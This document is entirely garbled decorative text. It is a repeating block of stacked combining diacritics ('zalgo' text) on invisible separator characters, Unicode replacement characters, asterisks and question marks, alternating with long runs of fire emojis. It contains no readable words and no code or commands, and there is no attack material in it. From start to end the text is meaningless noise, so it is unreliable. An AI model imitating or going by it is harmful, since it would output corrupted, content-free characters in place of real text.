̨̛̞̲̲̦͇̰̳̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̆͂́̈́̿͌͡͝